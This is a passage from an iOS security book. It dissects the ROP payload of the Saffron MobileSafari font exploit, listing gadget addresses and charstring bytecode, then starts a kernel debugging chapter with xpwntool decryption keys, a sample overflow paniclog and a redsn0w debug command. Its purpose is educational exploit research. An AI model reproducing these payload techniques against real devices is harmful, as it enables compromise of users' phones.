0x1e4d8 //r7, adjusted with the infoleak
0x3001a889 //pc, this does: blx r4 sub sp, r7, #4 pop{r4, r7, pc}
0x332a6129 //r4, address of mach_task_self
0x1e4e4 //r7, adjusted with the infoleak
0x3001a889 ////pc, this does: blx r4 sub sp, r7, #4 pop{r4, r7, pc}
For the most part, the rest of the code is nothing too complex and it makes a
huge use of the previously demonstrated pattern to perform function invocation.
The other two relevant parts of the shellcode are the beginning and the end,
where the ASLR delta is computed and the execution is restored, respectively.
The T1 routine responsible for writing the payload executes the following
instructions at the beginning:
0x00000000 8c push 0x1
0x00000001 8c push 0x1
0x00000002 a4 push 0x19
cc0088..iinndddd 224444 44//1166//22001122 55::4466::4411 PPMM
Chapter 8 n Return-Oriented Programming 245
0x00000003 0c 10 callothersubr #25 nargs=1;
get_buildchar top[0] = decoder->buildchar[idx];
This sequence simply pushes in reverse order the routine number, 0x19, the
number of parameters, 0x1, and the parameter to pass to the function. The
function pushes onto the stack the address of the C function T1_Parse_Glyph,
leaked with the exploit. Later, the following code is executed:
0x00000005 ff 33 73 f6 41 push 0x3373f641
0x0000000c 8d push 0x2
0x0000000d a0 push 0x15
0x0000000e 0c 10 callothersubr #21 nargs=2;
substract top[0] -= top[1]; top++
Routine 21 takes the two values pushed onto the stack (the address of the
T1_Parse_Glyph function found in-memory and the original address of the same
function found inside the library) and pushes the difference between the two that
will be stored later in an attacker-controlled location with the following code:
0x00000010 8c push 0x1
0x00000011 8d push 0x2
0x00000012 a3 push 0x18
0x00000013 0c 10 callothersubr #24 nargs=2;
set_buildchar decoder->buildchar[idx] = top[0];
This location that now contains the ASLR delta is used by routines 4, 5, and
7 to correctly relocate the rest of the payload. The next step is to calculate the
address of a specifi c gadget that increments the stack pointer. This is done with
the following code:
0x00000015 8b push 0x0
0x00000016 ff 32 87 9f 4b push 0x32879f4b
0x0000001d 8c push 0x1
0x0000001e 8c push 0x1
0x0000001f a4 push 0x19
0x00000020 0c 10 callothersubr #25 nargs=1;
get_buildchar top[0] = decoder->buildchar[idx];
0x00000022 8d push 0x2
0x00000023 9f push 0x14
0x00000024 0c 10 callothersubr #20 nargs=2;
add top[0] += top[1]; top++
0x00000026 0c 21 op_setcurrentpoint ; top -= 2; x=top[0];
y=top[1]; decoder->flex_state=0
The gadget stored in memory is the fi rst one executed and performs the
following operation:
add sp, #320
pop {r4, r5, pc}
cc0088..iinndddd 224455 44//1166//22001122 55::4466::4411 PPMM
246 Chapter 8 n Return-Oriented Programming
The next code snippet pushes onto the stack three dwords necessary for the
preceding gadget to work:
0x00000028 8b push 0x0
0x00000029 8f push 0x4
0x0000002a 0a callsubr #04 ; subr_put_dword
0x0000002b 8b push 0x0
0x0000002c 8f push 0x4
0x0000002d 0a callsubr #04 ; subr_put_dword
0x0000002e ff 30 00 5c bd push 0x30005cbd
0x00000033 ff 00 05 00 0push 0x5
0x00000038 0a callsubr #05 ;
subr_put_dword_adjust_lib
This code effectively pushes onto the stack the following dwords:
0x0
0x0
0x30005cbd + ASLR offset
From there, the stack pointer is adjusted once again and the rest of the ROP
payload is executed. The fi nal part of the payload sets the register R0 to 1337 and
then sets the stack pointer to a location that allows the attacker to resume execution:
0x00000aff ff 10 00 05 39 push 0x10000539
0x00000b04 ff 10 00 00 00 push 0x10000000
0x00000b09 ff 00 02 00 00 push 0x2
0x00000b0e ff 00 15 00 00 push 0x15
0x00000b13 0c 10 callothersubr #21 nargs=2;
subtract top[0] -= top[1]; top++
Because some values cannot be pushed onto the application stack, a trick is
used. This trick consists of subtracting two legal values to leave on the stack the
one requested. In the previous code, 0x10000539 and 0x10000000 are passed
as parameters to function 21. The result of the subtraction is pushed onto the
stack, that being 1337. The payload then stores 1337 into R0 by the means of the
gadget located at 0x30005e97:
0x00000b17 8b push 0x0
0x00000b18 8f push 0x4
0x00000b19 0a callsubr #04 ; subr_put_dword
0x00000b1a ff 30 00 5e 97 push 0x30005e97
0x00000b1f ff 00 05 00 00 push 0x5
0x00000b24 0a callsubr #05 ; subr_put_dword_adjust_lib
At this point the only part of the payload missing is to set the stack pointer
to a safe location that will not crash the browser:
0x00000b25 8b push 0x0
0x00000b26 8f push 0x4
0x00000b27 0a callsubr #04 ; subr_put_dword
cc0088..iinndddd 224466 44//1166//22001122 55::4466::4411 PPMM
Chapter 8 n Return-Oriented Programming 247
0x00000b28 ff 10 00 01 b0 push 0x100001b0
0x00000b2d ff 10 00 00 00 push 0x10000000
0x00000b32 ff 00 02 00 00 push 0x2
0x00000b37 ff 00 15 00 00 push 0x15
0x00000b3c 0c 10 callothersubr #21 nargs=2
;
subtract top[0] -= top[1]; top++
0x00000b3e 91 push 0x6
0x00000b3f 0a callsubr #06 ; 6
0x00000b40 ff 30 00 5d b5 push 0x30005db5
0x00000b45 ff 00 05 00 00 push 0x50000
The preceding code will, using the usual subtraction trick, push 0x1b0 onto
the stack. This value is later added to the value, a stack offset, obtained by rou-
tine 6. The gadget at 0x30005db5 sets the stack pointer at the previous value
decremented by 0x18, pops from that stack location a number of registers, and
resumes MobileSafari execution.
It is pretty obvious that Saffron is a very sophisticated and complex exploit.
Hopefully, you have gained some degree of understanding on how the ROP
payload inside it works. On the book’s website two scripts — Saffron-dump.py
and Saffron-ROP-dump.py — are available to help with the dump and analysis
of the rest of the shellcode.
Summary
In this chapter you have seen how DEP and code signing can be circumvented
using ROP. You started from the original return-to-libc technique and went all
the way down to ROP automation.
We proposed a simple way of testing ROP payloads and gave you an overview
of what an attacker is capable of doing using this technique on iOS.
Finally, we showed you two real-life examples of complex ROP payloads. The
fi rst one exfi ltrates data from the phone, and the second one uses a ROP payload
to exploit a local kernel vulnerability.
cc0088..iinndddd 224477 44//1166//22001122 55::4466::4411 PPMM
cc0088..iinndddd 224488 44//1166//22001122 55::4466::4411 PPMM
CHAPTER
9
Kernel Debugging
and Exploitation
So far, all the examples and exploit payloads within this book have concentrated
on the iOS user space. However, user space code is very limited in what it can do,
because of all the kernel-enforced security features. A compromise is therefore
not complete, unless you start to look deeper and learn how to attack the kernel
and penetrate the last line of defense. Within this chapter, you learn everything
that enables you to fi nd security vulnerabilities inside the kernel, to debug the
problems you discover, and to turn vulnerabilities into working kernel exploits.
Kernel Structure
Before you can look at the iOS kernel and learn its structure or start to reverse it,
you have to acquire a copy of the kernel in binary form. The actual binary you
need is called kernelcache.release.*, and you can fi nd it within iOS fi rmware
IPSW archives. However, the kernel binary is in IMG3 fi le format, which means
it is packed and also encrypted. To decrypt it, you need decryption keys and
also a tool called xpwntool, which was forked by many people and is available
in different versions, all over Github. You can fi nd the original version of xpwn-
tool at http://github.com/planetbeing/xpwntool.
The decryption key and AES initialization vector to decrypt an IMG3 fi le are
stored within the fi le itself. They are not stored in plaintext, but encrypted with
the device’s GID key. The GID key is baked into the hardware of the devices
249
cc0099..iinndddd 224499 44//1166//22001122 55::4477::0044 PPMM
250 Chapter 9 n Kernel Debugging and Exploitation
and cannot be extracted. It is shared among devices of the same processor class.
This means the iPhone 4, iPod4G, and iPad 1 share the same keys, but other
devices like the iPhone 3G(S) or the iPad 2 and iPhone 4S have different keys.
Therefore getting the real decryption key for a specifi c kernel is only possible
by code running on a device of the same processor class. Also the GID key is
disabled during the booting process before the kernel is started and therefore
a bootrom, iBoot or ramdisk level exploit is required to determine the decryp-
tion key. This also means that at the time of writing this book there is no way
to get the decryption keys for iPad 2 and iPhone 4S kernels, because there is
no public low-level exploit for these devices. For all the other devices, this is no
problem and the actual keys can be found on websites, like THEiPHONEWiKi
at http://theiphonewiki.com/ or within the keys.plist fi le of redsn0w.
NOTE Find code for this chapter at our book’s website at www.wiley.com/
go/ioshackershandbook.
With the key known, the decryption with xpwntool is pretty easy, and once
decrypted the kernel’s secrets can be lifted. The following example shows how
to use xpwntool to decrypt a kernel:
$ xpwntool kernelcache.iPod4,1_4.3.5_8L1.packed
kernelcache.iPod4,1_4.3.5_8L1.decrypted -iv 48c4bac83f853a2308d1525a4a83ac37 -k
4025a88dcb382c794a295ff9cfa32f26602c76497afc01f2c6843c510c9efcfc
The decryption reveals that the kernel binary is actually an ARM Mach-O
executable. Aside from the base kernel, it also contains several segments that
store all the loaded kernel extensions. Analyzing the strings within the binary
further also reveals that the iOS kernel is actually compiled from a non-public
tree of the XNU kernel source code. The structure of the iOS kernel is therefore
identical to the structure of the Mac OS X kernel. This means that the public
version of the XNU kernel helps whenever you try to analyze something in the
base kernel, with the exception that the ARM architecture-dependent source
code is not available. Aside from this, most of the things you know about Mac
OS X do directly apply to iOS, with a few exceptions. You can therefore also
fi nd the three major components of XNU inside the iOS kernel. These are the
bsd, the mach, and the IOKit components.
Kernel Debugging
When it comes to analyzing a kernel crash or developing a nontrivial kernel
exploit, it is necessary to have some feedback about what is going on inside the
kernel before a kernel panic occurs. Though binary analysis of the iOS kernel
has proven that most of the debugging capabilities of the Mac OS X kernel are
cc0099..iinndddd 225500 44//1166//22001122 55::4477::0055 PPMM
Chapter 9 n Kernel Debugging and Exploitation 251
also compiled into iOS, it is not as easy to make use of them. This section goes
into the debugging options available in iOS in more detail.
The fi rst available debugging option is to deduce the internal kernel state from
reading the paniclog that is generated by DumpPanic every time iOS reboots after
a kernel panic. These paniclog fi les are simple text fi les that look a bit different
depending on the type of kernel panic that occurred. Among the general infor-
mation about the panic, it contains the current state of the CPU and, if possible,
a short kernel backtrace. The system collects all the kernel paniclog fi les within
the directory /Library/Logs/CrashReporter/Panics, which is accessible directly
on jailbroken devices. For not jailbroken devices the com.apple.crashreportmover
service of the lockdown daemon can be started through the MobileDevices
framework, which will move the panic and crash logfi les to the directory /var/
mobile/Library/Logs/CrashReporter. From there they can be retrieved via the
com.apple.crashreportcopymobile AFC service. Every time iTunes is connected to
a device with paniclog fi les on it, these services are used to copy the fi les to your
Mac into the ~/Library/Logs/CrashReporter/MobileDevice//
Panics directory, from where they can be extracted easily.
Incident Identifier: 26FE1B21-A606-47A7-A382-4E268B94F19C
CrashReporter Key: 28cc8dca9c256b584f6cdf8fae0d263a3160f77d
Hardware Model: iPod4,1
Date/Time: 2011-10-20 09:56:46.373 +0900
OS Version: iPhone OS 4.3.5 (8L1)
panic(cpu 0 caller 0x80070098): sleh_abort: prefetch abort in kernel
mode:
fault_addr=0x41414140
r0: 0x0000000e r1: 0xcd2dc000 r2: 0x00000118 r3: 0x41414141
r4: 0x41414141 r5: 0x41414141 r6: 0x41414141 r7: 0x41414141
r8: 0x41414141 r9: 0xc0b4c580 r10: 0x41414141 r11: 0x837cc244
12: 0xc0b4c580 sp: 0xcd2dbf84 lr: 0x8017484f pc: 0x41414140
cpsr: 0x20000033 fsr: 0x00000005 far: 0x41414140
Debugger message: panic
OS version: 8L1
Kernel version: Darwin Kernel Version 11.0.0:
Sat Jul 9 00:59:43 PDT 2011;
root:xnu-1735.47~1/RELEASE_ARM_S5L8930X
iBoot version: iBoot-1072.61
secure boot?: NO
Paniclog version: 1
Epoch Time: sec usec
Boot : 0x4e9f70d3 0x00000000
Sleep : 0x00000000 0x00000000
Wake : 0x00000000 0x00000000
Calendar: 0x4e9f713d 0x000319ff
Task 0x80f07c60: 6227 pages, 79 threads: pid 0: kernel_task
Task 0x80f07a50: 185 pages, 3 threads: pid 1: launchd
cc0099..iinndddd 225511 44//1166//22001122 55::4477::0055 PPMM
252 Chapter 9 n Kernel Debugging and Exploitation
The following paniclog sample describes a kernel panic in a special kernel
that was booted. The panic occurred because the CPU tried to prefetch the next
instructions from the address 0x41414140. This indicated that a stack-based buffer
overfl ow overwrote the stored register values and the stored return address
with a lot of A characters. The most important information within the paniclog
is, however, the value of the LR register, because it contains the address of the
instruction following the call to the overfl owing function. In this case it allows
you to fi nd the code responsible for the overfl ow. However, this method of debug-
ging is very limited and does not allow you to backtrace from where the code
was called and determine or fi nd what input was used to reach the offending
code. Nevertheless, this method has been the primary method of debugging
during kernel exploit development for all the public, pre iOS 4.3 vulnerabilities
that have been used to jailbreak the devices. Only after the release of iOS 4.3
did kernel hackers succeed in using a more powerful debugging capability that
is contained in the iOS kernel.
From binary analysis of the iOS kernelcache fi le, it has been known for a
long time that the kernel debugging protocol KDP used for Mac OS X kernel
debugging is also compiled into the iOS kernel. To activate it, the debug boot
argument is required or a patched kernel must be booted. This has been pos-
sible for newer devices like the iPhone 4 ever since the release of the limera1n
bootrom exploit, which was created by George Hotz. But due to broken kernel
patches inside the public jailbreaks, initial attempts to use it failed and KDP
was considered broken or disabled by Apple for iOS. However, after a while
it was discovered that KDP was actually partially working and resulted only
some of the features, in instant kernel crashes on boot. This information made
it possible to track down the cause of the problems in the public kernel patches.
Nowadays KDP is fully usable.
Initially, using KDP for iOS kernel debugging was something only members
of the iOS jailbreak development teams were able to do, because they were the
only ones able to boot arbitrary kernels, or to boot recent iOS versions with boot
arguments. This fi rst changed when the Chronic Dev Team released an open
source version of their jailbreaking tool called syringe. With this code it was
fi nally possible for everyone to boot different kernels or supply arbitrary boot
arguments. Meanwhile, the iPhone Dev Team added this functionality into their
redsn0w tool, which brought the functionality into the reach of the normal end
user. Booting a kernel with activated KDP is now as easy as setting the debug
boot argument with the –a option:
$ ./redsn0w -j -a “debug=0x9”
The debug boot argument is actually a bit fi eld that allows you to select
or deselect certain KDP features. Table 9-1 lists the possible debugging fea-
tures that you can use by toggling the appropriate bits. The supported bits